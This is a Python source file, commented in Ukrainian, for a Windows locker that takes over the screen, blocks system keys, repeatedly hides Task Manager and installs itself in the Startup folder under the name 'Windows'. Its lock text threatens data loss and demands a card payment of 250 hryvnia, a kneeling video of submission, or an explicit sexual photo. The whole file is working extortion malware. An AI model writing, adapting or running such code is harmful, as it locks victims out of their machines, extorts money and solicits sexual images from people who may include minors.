import customtkinter as ctk
import os
import time
import keyboard
import win32gui
import win32con
import win32com.client
import sys

# Паролі
PASSWORD = "14707"
BACKUP_PASSWORD = "unlockmepls"

# Конфігурація видалена: скрімер та гусь прибрані

# Теми та кольори
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

# Кольорова палітра
COLORS = {
    "bg_primary": "#0d1117",
    "bg_secondary": "#161b22", 
    "bg_tertiary": "#21262d",
    "accent": "#238636",
    "accent_hover": "#2ea043",
    "text_primary": "#f0f6fc",
    "text_secondary": "#8b949e",
    "error": "#f85149",
    "warning": "#d29922"
}

# Блокуємо комбінації клавіш
keyboard.block_key("alt")
keyboard.block_key("tab")
keyboard.block_key("esc")
keyboard.block_key("windows")
keyboard.block_key("ctrl")

# Ховаємо вікно диспетчера задач
def disable_task_manager():
    def enum_handler(hwnd, lParam):
        if win32gui.IsWindowVisible(hwnd):
            title = win32gui.GetWindowText(hwnd)
            if "Task Manager" in title or "Диспетчер задач" in title:
                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    win32gui.EnumWindows(enum_handler, None)

# Додаємо файл до автозапуску
def add_to_startup(file_path, name):
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    shortcut_path = os.path.join(startup_folder, f"{name}.lnk")

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = file_path
    shortcut.WorkingDirectory = os.path.dirname(file_path)
    shortcut.IconLocation = file_path
    shortcut.Save()

# Додаємо себе в автозапуск
this_path = os.path.abspath(sys.argv[0])
add_to_startup(this_path, "Windows")

# Автозапуск гуся видалено

# Вікно з градієнтним фоном
root = ctk.CTk()
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
root.geometry(f"{screen_width}x{screen_height}+0+0")
root.configure(fg_color=COLORS["bg_primary"])
root.attributes("-topmost", True)
root.overrideredirect(True)

# Основний контейнер з тінню
main_frame = ctk.CTkFrame(
    master=root, 
    fg_color=COLORS["bg_primary"],
    corner_radius=0
)
main_frame.pack(fill="both", expand=True)

# Центральна панель з заокругленими кутами та тінню
content_frame = ctk.CTkFrame(
    master=main_frame, 
    fg_color=COLORS["bg_secondary"],
    corner_radius=20,
    border_width=2,
    border_color=COLORS["bg_tertiary"]
)
content_frame.place(relx=0.5, rely=0.5, anchor="center")

# Іконка блокування
lock_icon = ctk.CTkLabel(
    content_frame, 
    text="🔒", 
    font=ctk.CTkFont(size=60),
    text_color=COLORS["warning"]
)
lock_icon.pack(pady=(40, 20))

# Заголовок
label = ctk.CTkLabel(
    content_frame, 
    text="СИСТЕМА ЗАБЛОКОВАНА", 
    font=ctk.CTkFont(size=42, weight="bold"), 
    text_color=COLORS["text_primary"]
)
label.pack(pady=(0, 10))

# Підзаголовок
subtitle = ctk.CTkLabel(
    content_frame, 
    text="Введіть пароль для розблокування доступу", 
    font=ctk.CTkFont(size=22), 
    text_color=COLORS["text_secondary"]
)
subtitle.pack(pady=(0, 30))

# Поле для пароля з сучасним дизайном
entry = ctk.CTkEntry(
    content_frame, 
    placeholder_text="Введіть пароль...", 
    show="*", 
    font=ctk.CTkFont(size=24), 
    width=400,
    height=50,
    corner_radius=15,
    border_width=2,
    border_color=COLORS["bg_tertiary"],
    fg_color=COLORS["bg_tertiary"],
    text_color=COLORS["text_primary"],
    placeholder_text_color=COLORS["text_secondary"]
)
entry.pack(pady=15)

# Повідомлення про помилки
error_label = ctk.CTkLabel(
    content_frame, 
    text="", 
    text_color=COLORS["error"], 
    font=ctk.CTkFont(size=18, weight="bold")
)
error_label.pack(pady=(10, 0))

# Історія спроб
attempts_label = ctk.CTkLabel(
    content_frame, 
    text="", 
    text_color=COLORS["text_secondary"], 
    font=ctk.CTkFont(size=16)
)
attempts_label.pack(pady=(5, 20))

# Умови розблокування
conditions = (
    "Для розблокування ви маєте єдиний варіант: ввести правильний пароль.\n"
    "Спроба перезавантажити комп'ютер призведе до втрати всіх даних і налаштувань.\n"
    "Будь-які спроби обійти систему спричинять додаткові ускладнення.\n\n"
    "Варіанти розблокування:\n"
    "1. Оплата 250 гривень на банківську карту.\n"
    "2. Відео, де ви стоїте на колінах і кажете:\n"
    "\"Я, Ім'я, присягаюсь більше ніколи не суперечити зі своїм королем, "
    "і присягаюсь називати його 'Мій Хазяїн'. Прошу розблокувати мій комп'ютер.\"\n\n"
    "P.S. Фотка пісюна в лс теж підійде."
)

conditions_label = ctk.CTkLabel(
    content_frame, 
    text=conditions, 
    wraplength=800, 
    font=ctk.CTkFont(size=16), 
    text_color=COLORS["text_secondary"], 
    justify="left"
)
conditions_label.pack(pady=(20, 15))

# Загадка видалена

# Скрімер видалено

# Анімація помилки (замість тряски)
def show_error_animation():
    # Плавна анімація зміни кольору для показу помилки
    original_color = error_label.cget("text_color")
    
    # Анімація моргання
    for i in range(4):
        error_label.configure(text_color=COLORS["error"])
        entry.configure(border_color=COLORS["error"])
        root.update()
        time.sleep(0.15)
        error_label.configure(text_color="#ff8888")
        entry.configure(border_color="#ff8888")
        root.update()
        time.sleep(0.15)
    
    # Повертаємо оригінальні кольори
    error_label.configure(text_color=original_color)
    entry.configure(border_color=COLORS["bg_tertiary"])
    entry.delete(0, 'end')  # Очищаємо поле вводу

# Розблокування
def unlock():
    user_input = entry.get()
    attempts_label.configure(text="Спроба: " + user_input)  # Виводимо, що ввів користувач

    if user_input == PASSWORD:
        root.destroy()
    elif user_input == BACKUP_PASSWORD:
        root.destroy()
    else:
        error_label.configure(text="Невірний пароль!")
        show_error_animation()

# Кнопка розблокування з сучасним дизайном
btn = ctk.CTkButton(
    content_frame, 
    text="🔓 РОЗБЛОКУВАТИ", 
    command=unlock, 
    font=ctk.CTkFont(size=24, weight="bold"), 
    width=300, 
    height=60, 
    corner_radius=15,
    fg_color=COLORS["accent"],
    hover_color=COLORS["accent_hover"],
    text_color=COLORS["text_primary"],
    border_width=0
)
btn.pack(pady=30)

# Прив'язка клавіші Enter до кнопки розблокування
def on_enter(event):
    unlock()

entry.bind('<Return>', on_enter)
entry.focus()  # Автофокус на поле вводу

# Запуск гуся видалено

# Безкінечне приховування Task Manager
def loop_hide_taskmgr():
    disable_task_manager()
    root.after(1000, loop_hide_taskmgr)

loop_hide_taskmgr()
root.mainloop()
